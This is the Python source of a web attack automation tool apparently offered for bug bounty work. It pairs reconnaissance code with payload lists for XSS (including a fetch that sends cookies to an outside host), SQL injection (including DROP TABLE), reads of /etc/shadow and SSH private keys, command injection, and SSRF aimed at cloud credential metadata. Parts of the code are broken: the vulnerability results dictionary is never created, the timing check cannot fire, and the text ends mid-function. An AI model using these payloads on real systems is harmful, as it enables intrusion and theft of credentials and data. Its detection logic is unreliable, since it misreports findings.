#!/usr/bin/env python3
"""
HYDRA-BUG ULTIMATE v2.0 - Advanced Bug Hunting Automation Framework
Professional Bug Bounty Automation Tool - Elite Edition

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: python3 hydra_bug_ultimate.py -t example.com
"""

import sys
import os
import re
import time
import json
import socket
import threading
import subprocess
import hashlib
import base64
import random
import asyncio
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup
import dns.resolver
import whois
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP

# ==================== VERSION ====================
VERSION = "2.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"
ELITE_STATUS = True

# ==================== COLOR CODES ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    GOLD = '\033[93m'
    NEON = '\033[96m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

# ==================== BANNER ====================
def print_banner():
    banner = f"""
{Colors.GOLD}{Colors.BOLD}    ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
    ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
    ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
    ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
    ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
    ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - BUG HUNTING ELITE{Colors.WHITE}
{Colors.CYAN}    Advanced Bug Bounty Automation - Elite Edition{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== UTILITY FUNCTIONS ====================
class Utilities:
    @staticmethod
    def timestamp() -> str:
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    @staticmethod
    def clean_url(url: str) -> str:
        return url.strip().rstrip('/')
    
    @staticmethod
    def extract_domain(url: str) -> str:
        parsed = urlparse(url)
        return parsed.netloc or parsed.path
    
    @staticmethod
    def generate_id(length=8) -> str:
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=length))
    
    @staticmethod
    def save_report(data: Dict, filename: str):
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        cprint(f"[+] Report saved: {filename}", Colors.GREEN)
    
    @staticmethod
    def hash_string(data: str) -> str:
        return hashlib.md5(data.encode()).hexdigest()[:8]
    
    @staticmethod
    def random_string(length=8) -> str:
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=length))
    
    @staticmethod
    def random_ip() -> str:
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

# ==================== ADVANCED PAYLOAD ENGINE ====================
class PayloadEngine:
    @staticmethod
    def xss_payloads() -> List[str]:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'><script>alert(1)</script>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "\\\"><script>alert(1)</script>",
            "';alert(1);//",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "><img src=x onerror=alert(1)>",
            "'';!--\"<XSS>=&{()}",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"`/+/onmouseenter=1/+/[*/[]/+alert(1)//'>",
            "javascript:fetch('//{}/steal?cookie='+document.cookie)"
        ]
    
    @staticmethod
    def sqli_payloads() -> List[str]:
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR '1'='1' AND 'a'='a",
            "' UNION SELECT NULL, NULL, NULL--",
            "' UNION SELECT username, password FROM users--",
            "admin'--",
            "1' AND 1=(SELECT COUNT(*) FROM users)--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
            "' AND SLEEP(5) AND '1'='1",
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(1000000,MD5(1))--",
            "' OR (SELECT * FROM users WHERE id=1) IS NOT NULL--",
            "' OR EXISTS(SELECT * FROM users WHERE id=1)--"
        ]
    
    @staticmethod
    def lfi_payloads() -> List[str]:
        return [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../etc/passwd",
            "../etc/passwd",
            "....//....//....//etc/passwd",
            "../../../../etc/passwd%00",
            "../../../../etc/shadow",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "../../../../etc/hosts",
            "../../../../proc/self/environ",
            "../../../../proc/version"
        ]
    
    @staticmethod
    def rce_payloads() -> List[str]:
        return [
            "; ls -la",
            "| ls -la",
            "|| ls -la",
            "&& ls -la",
            "& ls -la",
            "; whoami",
            "| whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; id",
            "| id",
            "; pwd",
            "| pwd",
            "; uname -a",
            "| uname -a",
            "; echo 'test'",
            "| echo 'test'"
        ]
    
    @staticmethod
    def path_traversal_payloads() -> List[str]:
        return [
            "../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../windows/win.ini",
            "../../../../../../../../../../../../boot.ini",
            "../../../../../../../../../../../../etc/hosts",
            "../../../../../../../../../../../../proc/self/environ",
            "../../../../../../../../../../../../proc/version",
            "../../../../../../../../../../../../etc/shadow",
            "../../../../../../../../../../../../root/.ssh/id_rsa"
        ]
    
    @staticmethod
    def ssrf_payloads() -> List[str]:
        return [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://127.0.0.1:8080/admin",
            "http://localhost:8080/admin",
            "http://[::1]:8080/admin",
            "http://10.0.0.1/admin",
            "http://192.168.1.1/admin",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "gopher://127.0.0.1:8080/_GET /admin HTTP/1.0%0d%0a%0d%0a"
        ]
    
    @staticmethod
    def host_header_payloads() -> List[str]:
        return [
            "evil.com",
            "attacker.com",
            "localhost",
            "127.0.0.1",
            "0.0.0.0",
            "[::1]",
            "example.com",
            "test.evil.com",
            "admin.evil.com"
        ]
    
    @staticmethod
    def crlf_payloads() -> List[str]:
        return [
            "%0d%0a",
            "%0a%0d",
            "%0d",
            "%0a",
            "\\r\\n",
            "\\n\\r",
            "\r\n",
            "\n\r"
        ]

# ==================== ADVANCED RECON ENGINE ====================
class AdvancedReconEngine:
    def __init__(self, target: str):
        self.target = target
        self.results = {
            'subdomains': [],
            'ips': [],
            'ports': [],
            'technologies': [],
            'emails': [],
            'urls': [],
            'parameters': [],
            'directories': [],
            'files': [],
            'js_files': [],
            'css_files': [],
            'api_endpoints': []
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.visited = set()
        self.max_depth = 3
    
    def discover_subdomains(self):
        cprint("[RECON] Discovering subdomains...", Colors.BLUE)
        
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test',
            'staging', 'prod', 'app', 'portal', 'dashboard',
            'cdn', 'static', 'media', 'img', 'assets', 'files',
            'docs', 'support', 'help', 'status', 'backup',
            'blog', 'shop', 'store', 'forum', 'community',
            'partner', 'partners', 'download', 'uploads',
            'video', 'stream', 'live', 'alpha', 'beta',
            'demo', 'sandbox', 'internal', 'corp'
        ]
        
        found = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self._check_subdomain, sub): sub for sub in common_subdomains}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)
                    cprint(f"[+] Found: {result}", Colors.GREEN)
        
        self.results['subdomains'] = found
        return found
    
    def _check_subdomain(self, sub: str) -> Optional[str]:
        try:
            domain = f"{sub}.{self.target}"
            socket.gethostbyname(domain)
            return domain
        except:
            return None
    
    def discover_directories(self):
        cprint("[RECON] Discovering directories...", Colors.BLUE)
        
        common_dirs = [
            'admin', 'api', 'login', 'dashboard', 'panel', 'console',
            'manage', 'adminer', 'phpmyadmin', 'wp-admin', 'administrator',
            'user', 'users', 'profile', 'account', 'settings',
            'config', 'conf', 'backup', 'temp', 'tmp', 'cache',
            'logs', 'log', 'error', 'debug', 'test', 'tests',
            'docs', 'doc', 'documentation', 'help', 'support',
            'download', 'uploads', 'images', 'css', 'js', 'fonts',
            'assets', 'media', 'static', 'public', 'private',
            'app', 'src', 'vendor', 'lib', 'inc', 'include',
            'plugins', 'modules', 'themes', 'templates', 'views'
        ]
        
        found = []
        base_url = f"http://{self.target}"
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(self._check_directory, base_url, dir): dir for dir in common_dirs}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)
                    cprint(f"[+] Directory: {result}", Colors.GREEN)
        
        self.results['directories'] = found
        return found
    
    def _check_directory(self, base_url: str, dir_path: str) -> Optional[str]:
        try:
            url = f"{base_url}/{dir_path}"
            response = self.session.get(url, timeout=3)
            if response.status_code in [200, 301, 302, 403]:
                return url
        except:
            pass
        return None
    
    def discover_api_endpoints(self):
        cprint("[RECON] Discovering API endpoints...", Colors.BLUE)
        
        api_patterns = [
            '/api/', '/api/v1/', '/api/v2/', '/rest/',
            '/rest/api/', '/graphql', '/graphiql',
            '/swagger', '/swagger-ui', '/docs', '/docs/api',
            '/v1/', '/v2/', '/v3/', '/latest/',
            '/service/', '/services/', '/soap/', '/xmlrpc.php',
            '/wp-json/', '/index.php?rest_route=/'
        ]
        
        found = []
        base_url = f"http://{self.target}"
        
        for pattern in api_patterns:
            try:
                url = f"{base_url}{pattern}"
                response = self.session.get(url, timeout=3)
                if response.status_code in [200, 301, 302, 403, 404]:
                    found.append(url)
                    cprint(f"[+] API: {url}", Colors.GREEN)
            except:
                pass
        
        self.results['api_endpoints'] = found
        return found
    
    def spider(self, url: str, depth: int = 0):
        if depth > self.max_depth or url in self.visited:
            return
        
        self.visited.add(url)
        try:
            response = self.session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract links
            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    full_url = urljoin(url, href)
                    if self.target in full_url and full_url not in self.visited:
                        self.results['urls'].append(full_url)
                        self.spider(full_url, depth + 1)
            
            # Extract JS files
            for script in soup.find_all('script'):
                src = script.get('src')
                if src:
                    full_url = urljoin(url, src)
                    if self.target in full_url:
                        self.results['js_files'].append(full_url)
                        cprint(f"[+] JS: {full_url}", Colors.DIM)
            
            # Extract CSS files
            for link in soup.find_all('link', rel='stylesheet'):
                href = link.get('href')
                if href:
                    full_url = urljoin(url, href)
                    if self.target in full_url:
                        self.results['css_files'].append(full_url)
                        cprint(f"[+] CSS: {full_url}", Colors.DIM)
                        
        except Exception as e:
            pass

# ==================== ADVANCED VULNERABILITY SCANNER ====================
class AdvancedVulnScanner:
    def __init__(self, target: str):
        self.target = target
        self.results = {
            'xss': [],
            'sqli': [],
            'lfi': [],
            'rce': [],
            'ssrf': [],
            'xxe': [],
            'open_redirect': [],
            'idor': [],
            'csrf': [],
            'host_header': [],
            'crlf': [],
            'path_traversal': [],
            'info_disclosure': [],
            'subdomain_takeover': [],
            'cors_misconfig': [],
            'rate_limiting': [],
            'misconfigurations': []
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.payloads = {
            'xss': PayloadEngine.xss_payloads(),
            'sqli': PayloadEngine.sqli_payloads(),
            'lfi': PayloadEngine.lfi_payloads(),
            'rce': PayloadEngine.rce_payloads(),
            'path_traversal': PayloadEngine.path_traversal_payloads(),
            'ssrf': PayloadEngine.ssrf_payloads(),
            'host_header': PayloadEngine.host_header_payloads(),
            'crlf': PayloadEngine.crlf_payloads()
        }
    
    def scan_xss(self, url: str, params: List[str]):
        cprint("[XSS] Scanning for XSS...", Colors.YELLOW)
        vulnerabilities = []
        
        for param in params:
            for payload in self.payloads['xss']:
                try:
                    test_url = url.replace(param, f"{param}={payload}")
                    response = self.session.get(test_url, timeout=5)
                    
                    if payload in response.text:
                        vulnerabilities.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'Reflected XSS',
                            'severity': 'High'
                        })
                        cprint(f"[!] XSS Found: {test_url[:100]}", Colors.RED)
                        break
                except:
                    pass
        
        self.results['xss'] = vulnerabilities
        return vulnerabilities
    
    def scan_sqli_blind(self, url: str, params: List[str]):
        cprint("[SQLI] Scanning for Blind SQL Injection...", Colors.YELLOW)
        vulnerabilities = []
        
        for param in params:
            for payload in self.payloads['sqli']:
                try:
                    test_url = url.replace(param, f"{param}={payload}")
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=5)
                    elapsed = time.time() - start_time
                    
                    if elapsed > 5:
                        vulnerabilities.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'Blind SQL Injection (Time-based)',
                            'severity': 'Critical',
                            'time': elapsed
                        })
                        cprint(f"[!] Blind SQLI Found: {test_url[:100]}", Colors.RED)
                        break
                except:
                    pass
        
        self.results['sqli'] = vulnerabilities
        return vulnerabilities
    
    def scan_lfi(self, url: str, params: List[str]):
        cprint("[LFI] Scanning for Local File Inclusion...", Colors.YELLOW)
        vulnerabilities = []
        
        for param in params:
            for payload in self.payloads['lfi']:
                try:
                    test_url = url.replace(param, f"{param}={payload}")
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for common file content
                    if 'root:' in response.text or 'bin:' in response.text:
                        vulnerabilities.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'Local File Inclusion',
                            'severity': 'Critical'
                        })
                        cprint(f"[!] LFI Found: {test_url[:100]}", Colors.RED)
                        break
                except:
                    pass
        
        self.results['lfi'] = vulnerabilities
        return vulnerabilities
    
    def scan_rce(self, url: str, params: List[str]):
        cprint("[RCE] Scanning for Remote Code Execution...", Colors.YELLOW)
        vulnerabilities = []
        
        for param in params:
            for payload in self.payloads['rce']:
                try:
                    test_url = url.replace(param, f"{param}={payload}")
                    response = self.session.get(test_url, timeout=5)
                    
                    if 'uid=' in response.text or 'id=' in response.text:
                        vulnerabilities.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'Remote Code Execution',
                            'severity': 'Critical'
                        })
                        cprint(f"[!] RCE Found: {test_url[:100]}", Colors.RED)
                        break
                except:
                    pass
        
        self.results['rce'] = vulnerabilities
        return vulnerabilities
    
    def scan_ssrf(self, url: str, params: List[str]):
        cprint("[SSRF] Scanning for Server-Side Request Forgery...", Colors.YELLOW)
        vulnerabilities = []
        
        for param in params:
            for payload in self.payloads['ssrf']:
                try:
                    test_url = url.replace(param, f"{param}={payload}")
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for cloud metadata
                    if 'ami-id' in response.text or 'instance-id' in response.text:
                        vulnerabilities.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'Server-Side Request Forgery',
                            'severity': 'High'
                        })
                        cprint(f"[!] SSRF Found: {test_url[:100]}", Colors.RED)
                        break
                except:
                    pass
        
        self.results['ssrf'] = vulnerabilities
        return vulnerabilities
    
    def scan_host_header_injection(self, url: str):
        cprint("[HOST] Scanning for Host Header Injection...", Colors.YELLOW)
        vulnerabilities = []
        
        for host in self.payloads['host_header']:
            try:
                headers = {'Host': host}
                response = self.session.get(url, headers=headers, timeout=5, allow_redirects=False)
                
                if response.status_code in [301, 302, 307, 308]:
                    location = response.headers.get('Location', '')
                    if host in location:
                        vulnerabilities.append({
                            'url': url,
                            'host': host,
                            'type': 'Host Header Injection',
                            'severity': 'Medium'
                        })
                        cprint(f"[!] Host Header Injection: {host}", Colors.RED)
            except:
                pass
        
        self.results['host_header'] = vulnerabilities
        return vulnerabilities
    
    def scan_crlf_injection(self, url: str, params: List[str]):
        cprint("[CRLF] Scanning for CRLF Injection...", Colors.YELLOW)
        vulnerabilities = []
        
        for param in params:
            for payload in self.payloads['crlf']:
                try:
                    test_url = url.replace(param, f"{param}={payload}")
                    response = self.session.get(test_url, timeout=5)
                    
                    if '%0d%0a' in response.text or 'Location:' in response.text:
                        vulnerabilities.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'CRLF Injection',
                            'severity': 'Medium'
                        })
                        cprint(f"[!] CRLF Found: {test_url[:100]}", Colors.RED)
                        break
                except:
                    pass
        
        self.results['crlf'] = vulnerabilities
        return vulnerabilities
    
    def scan_subdomain_takeover(self):
        cprint("[SUBDOMAIN] Scanning for Subdomain Takeover...", Colors.YELLOW)
        vulnerabilities = []
        
        cnames = {
            'github.io': 'GitHub Pages',
            'herokuapp.com': 'Heroku',
            'azurewebsites.net': 'Azure',
            'cloudfront.net': 'AWS CloudFront',
            's3.amazonaws.com': 'AWS S3',
            'readthedocs.io': 'ReadTheDocs',
            'appspot.com': 'Google App Engine',
            'surge.sh': 'Surge',
            'netlify.com': 'Netlify',
            'firebaseapp.com': 'Firebase'
        }
        
        for subdomain in self.results.get('subdomains', []):
            try:
                answers = dns.resolver.resolve(subdomain, 'CNAME')
                for rdata in answers:
                    cname = str(rdata.target).rstrip('.')
                    for domain, service in cnames.items():
                        if domain in cname:
                            vulnerabilities.append({
                                'subdomain': subdomain,
                                'cname': cname,
                                'service': service,
                                'type': 'Subdomain Takeover',
                                'severity': 'High'
                            })
                            cprint(f"[!] Subdomain Takeover: {subdomain} -> {cname}", Colors.RED)
            except:
                pass
        
        self.results['subdomain_takeover'] = vulnerabilities
        return vulnerabilities
    
    def scan_cors_misconfiguration(self, url: str):
        cprint("[CORS] Scanning for CORS Misconfiguration...", Colors.YELLOW)
        vulnerabilities = []
        
        origins = [
            'https://evil.com',
            'https://attacker.com',
            'http://localhost',
            'null',
            '*.evil.com'
        ]
        
        for origin in origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(url, headers=headers, timeout=5)
                
                if 'Access-Control-Allow-Origin' in response.headers:
                    acao = response.headers['Access-Control-Allow-Origin']
                    if acao == '*' or acao == origin:
                        vulnerabilities.append({
                            'url': url,
                            'origin': origin,
                            'acao': acao,
                            'type': 'CORS Misconfiguration',
                            'severity': 'High'
                        })
                        cprint(f"[!] CORS Misconfig: {origin} -> {acao}", Colors.RED)
            except:
                pass
        
        self.results['cors_misconfig'] = vulnerabilities
        return vulnerabilities
    
    def scan_rate_limiting(self, url: str):
        cprint("[RATE] Testing Rate Limiting...", Colors.YELLOW)
        
        try:
            start_time = time.time()
            responses = []
            
            for i in range(20):
                response = self.session.get(url, timeout=2)
                responses.append(response.status_code)
            
            if len(set(responses)) == 1:
                self.results['rate_limiting'] = [{
                    'url': url,
                    'status': 'Rate limiting NOT detected',
                    'type': 'Rate Limiting Bypass',
                    'severity': 'Low'
                }]
                cprint("[!] No rate limiting detected", Colors.RED)
            else:
                self.results['rate_limiting'] = [{
                    'url': url,
                    'status': 'Rate limiting detected',
                    'type': 'Rate Limiting',
                    'severity': 'Info'
                }]
                cprint("[+] Rate limiting detected", Colors.GREEN)
        except:
            pass

# ==================== SEVERITY SCORER ====================
class SeverityScorer:
    SEVERITY_MAP = {
        'Critical': {
            'score': 10,
            'color': Colors.RED,
            'priority': 'Immediate'
        },
        'High': {
            'score': 8,
            'color': Colors.YELLOW,
            'priority': 'High'
        },
        'Medium': {
            'score': 5,
            'color': Colors.BLUE,
            'priority': 'Medium'
        },
        'Low': {
            'score': 2,
            'color': Colors.GREEN,
            'priority': 'Low'
        },
        'Info': {
            'score': 1,
            'color': Colors.DIM,
            'priority': 'Informational'
        }
    }
    
    @staticmethod
    def score(vulnerability: Dict) -> Dict:
        severity = vulnerability.get('severity', 'Info')
        return SeverityScorer.SEVERITY_MAP.get(severity, SeverityScorer.SEVERITY_MAP['Info'])

# ==================== MAIN FRAMEWORK ====================
class HydraBugUltimate:
    def __init__(self, target: str):
        self.target = target
        self.results = {}
        self.start_time = time.time()
        self.total_findings = 0
        self.critical_count = 0
        self.high_count = 0
        self.medium_count = 0
        self.low_count = 0
    
    def run_elite_scan(self):
        cprint("\n" + "="*80, Colors.GOLD)
        cprint(" ELITE BUG HUNTING SCAN - v{}".format(VERSION), Colors.GOLD, bold=True)
        cprint("="*80, Colors.GOLD)
        cprint("[*] Target: {}".format(self.target), Colors.CYAN)
        cprint("[*] Started: {}".format(Utilities.timestamp()), Colors.CYAN)
        
        # Phase 1: Advanced Reconnaissance
        recon = AdvancedReconEngine(self.target)
        self.results['recon'] = {
            'subdomains': recon.discover_subdomains(),
            'directories': recon.discover_directories(),
            'api_endpoints': recon.discover_api_endpoints(),
            'technologies': [],
            'emails': [],
            'urls': [],
            'parameters': [],
            'js_files': [],
            'css_files': []
        }
        
        # Phase 2: Vulnerability Scanning
        vuln = AdvancedVulnScanner(self.target)
        
        # Test parameters
        test_params = ['id', 'q', 'page', 'p', 'id', 'user', 'username', 'name', 'key', 'token', 'session']
        
        # XSS
        self.results['vuln']['xss'] = vuln.scan_xss(
            f"http://{self.target}/test.php",
            test_params
        )
        
        # SQL Injection
        self.results['vuln']['sqli'] = vuln.scan_sqli_blind(
            f"http://{self.target}/test.php",
            test_params
        )
        
        # LFI
        self.results['vuln']['lfi'] = vuln.scan_lfi(
            f"http://{self.target}/test.php",
            test_params
        )
        
        # RCE
        self.results['vuln']['rce'] = vuln.scan_rce(
            f"http://{self.target}/test.php",
            test_params
        )
        
        # SSRF
        self.results['vuln']['ssrf'] = vuln.scan_ssrf(
            f"http://{self.target}/test.php",
            test_params
        )
        
        # Host Header Injection
        self.results['vuln']['host_header'] = vuln.scan_host_header_injection(
            f"http://{self.target}/"
        )
        
        # CRLF Injection
        self.results['vuln']['crlf'] = vuln.scan_crlf_injection(
            f"http://{self.target}/test.php",
            test_params
        )
        
        # Subdomain Takeover
        self.results['vuln']['subdomain_takeover'] = vuln.scan_subdomain_takeover()
        
        # CORS Misconfiguration
        self.results['vuln']['cors_misconfig'] = vuln.scan_cors_misconfiguration(
            f"http://{self.target}/"
        )
        
        # Rate Limiting
        vuln.scan_rate_limiting(f"http://{self.target}/")
        
        # Phase 3: Calculate Statistics
        self._calculate_stats()
        
        # Phase 4: Generate Report
        self.generate_elite_report()
        
        return self.results
    
    def _calculate_stats(self):
        vuln_data = self.results.get('vuln', {})
        
        for vuln_type, findings in vuln_data.items():
            if isinstance(findings, list):
                self.total_findings += len(findings)
                for finding in findings:
                    severity = finding.get('severity', 'Info')
                    if severity == 'Critical':
                        self.critical_count += 1
                    elif severity == 'High':
                        self.high_count += 1
                    elif severity == 'Medium':
                        self.medium_count += 1
                    elif severity == 'Low':
                        self.low_count += 1
    
    def generate_elite_report(self):
        cprint("\n[REPORT] Generating elite security report...", Colors.GOLD)
        
        timestamp = Utilities.timestamp()
        elapsed = int(time.time() - self.start_time)
        
        # HTML Report
        html = self._generate_elite_html(timestamp, elapsed)
        html_file = f"elite_report_{self.target}_{int(time.time())}.html"
        with open(html_file, 'w') as f:
            f.write(html)
        cprint(f"[+] Elite Report saved: {html_file}", Colors.GREEN)
        
        # JSON Report
        json_file = f"elite_report_{self.target}_{int(time.time())}.json"
        self.results['metadata'] = {
            'timestamp': timestamp,
            'elapsed': elapsed,
            'total_findings': self.total_findings,
            'critical': self.critical_count,
            'high': self.high_count,
            'medium': self.medium_count,
            'low': self.low_count
        }
        with open(json_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        cprint(f"[+] JSON Report saved: {json_file}", Colors.GREEN)
    
    def _generate_elite_html(self, timestamp: str, elapsed: int) -> str:
        return f"""
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA-BUG ULTIMATE - Elite Security Report</title>
    <style>
        body {{ background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }}
        .header {{ border-bottom: 2px solid #ffd700; padding-bottom: 10px; margin-bottom: 20px; }}
        .section {{ background: #111; padding: 15px; margin: 10px 0; border: 1px solid #333; border-radius: 8px; }}
        .critical {{ color: #ff003c; }}
        .high {{ color: #ff8a00; }}
        .medium {{ color: #ffa500; }}
        .low {{ color: #ffd700; }}
        .info {{ color: #00ff41; }}
        .gold {{ color: #ffd700; }}
        .badge {{ display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 12px; margin: 2px; }}
        .badge-critical {{ background: #ff003c; color: white; }}
        .badge-high {{ background: #ff8a00; color: white; }}
        .badge-medium {{ background: #ffa500; color: white; }}
        .badge-low {{ background: #ffd700; color: black; }}
        table {{ width: 100%; border-collapse: collapse; }}
        td, th {{ padding: 8px; border: 1px solid #333; }}
        th {{ background: #222; color: #ffd700; }}
        .link {{ color: #4ecdc4; text-decoration: none; }}
        .link:hover {{ text-decoration: underline; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 10px 0; }}
        .stat-card {{ background: #1a1a1a; padding: 15px; text-align: center; border-radius: 8px; border: 1px solid #333; }}
        .stat-number {{ font-size: 32px; font-weight: bold; }}
        .stat-label {{ font-size: 14px; color: #666; }}
    </style>
</head>
<body>
    <div class="header">
        <h1 class="gold">HYDRA-BUG ULTIMATE v{VERSION}</h1>
        <p>Elite Security Assessment Report</p>
        <p>Target: <span class="gold">{self.target}</span></p>
        <p>Generated: {timestamp}</p>
        <p>Duration: {elapsed}s</p>
    </div>
    
    <div class="section">
        <h2 class="gold">Executive Summary</h2>
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" style="color:#ffd700;">{self.total_findings}</div>
                <div class="stat-label">Total Findings</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#ff003c;">{self.critical_count}</div>
                <div class="stat-label">Critical</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#ff8a00;">{self.high_count}</div>
                <div class="stat-label">High</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#ffa500;">{self.medium_count}</div>
                <div class="stat-label">Medium</div>
            </div>
        </div>
    </div>
    
    <div class="section">
        <h2 class="gold">Reconnaissance Results</h2>
        <table>
            <tr><td>Subdomains:</td><td>{len(self.results.get('recon', {}).get('subdomains', []))}</td></tr>
            <tr><td>Directories:</td><td>{len(self.results.get('recon', {}).get('directories', []))}</td></tr>
            <tr><td>API Endpoints:</td><td>{len(self.results.get('recon', {}).get('api_endpoints', []))}</td></tr>
            <tr><td>JS Files:</td><td>{len(self.results.get('recon', {}).get('js_files', []))}</td></tr>
            <tr><td>CSS Files:</td><td>{len(self.results.get('recon', {}).get('css_files', []))}</td></tr>
        </table>
    </div>
    
    <div class="section">
        <h2 class="gold">Vulnerability Details</h2>
        {self._generate_vuln_table()}
    </div>
    
    <div class="section" style="text-align:center; color:#666;">
        <p class="gold">Report generated by HYDRA-BUG ULTIMATE v{VERSION}</p>
        <p>Author: {AUTHOR} | {LICENSE}</p>
        <p>Made with passion for bug bounty hunting</p>
    </div>
</body>
</html>
        """
    
    def _generate_vuln_table(self) -> str:
        vuln_data = self.results.get('vuln', {})
        html = ""
        
        vuln_types = [
            ('XSS', 'xss', 'critical'),
            ('SQL Injection', 'sqli', 'critical'),
            ('LFI', 'lfi', 'critical'),
            ('RCE', 'rce', 'critical'),
            ('SSRF', 'ssrf', 'high'),
            ('Host Header Injection', 'host_header', 'medium'),
            ('CRLF Injection', 'crlf', 'medium'),
            ('Subdomain Takeover', 'subdomain_takeover', 'high'),
            ('CORS Misconfiguration', 'cors_misconfig', 'high')
        ]
        
        for vuln_name, vuln_key, severity in vuln_types:
            findings = vuln_data.get(vuln_key, [])
            if findings:
                badge_class = f"badge-{severity}"
                html += f"""
                <h3>{vuln_name} <span class="badge {badge_class}">{len(findings)}</span></h3>
                <table>
                    <tr><th>#</th><th>URL</th><th>Details</th></tr>
                """
                for idx, finding in enumerate(findings, 1):
                    url = finding.get('url', 'N/A')[:100]
                    detail = finding.get('payload', finding.get('type', 'N/A'))
                    html += f"""
                    <tr>
                        <td>{idx}</td>
                        <td><a class="link" href="{url}" target="_blank">{url}...</a></td>
                        <td>{detail}</td>
                    </tr>
                    """
                html += "</table>"
        
        return html
    
    def show_elite_summary(self):
        cprint("\n" + "="*80, Colors.GOLD)
        cprint(" ELITE SCAN COMPLETE", Colors.GOLD, bold=True)
        cprint("="*80, Colors.GOLD)
        
        cprint(f"\n[+] Target: {self.target}", Colors.CYAN)
        cprint(f"[+] Total Findings: {self.total_findings}", Colors.YELLOW)
        cprint(f"[+] Critical: {self.critical_count}", Colors.RED)
        cprint(f"[+] High: {self.high_count}", Colors.YELLOW)
        cprint(f"[+] Medium: {self.medium_count}", Colors.BLUE)
        cprint(f"[+] Low: {self.low_count}", Colors.GREEN)
        
        if self.critical_count > 0:
            cprint("\n[!] CRITICAL VULNERABILITIES FOUND - Immediate action required", Colors.RED, bold=True)
        elif self.high_count > 0:
            cprint("\n[!] High severity vulnerabilities found - Action recommended", Colors.YELLOW, bold=True)
        else:
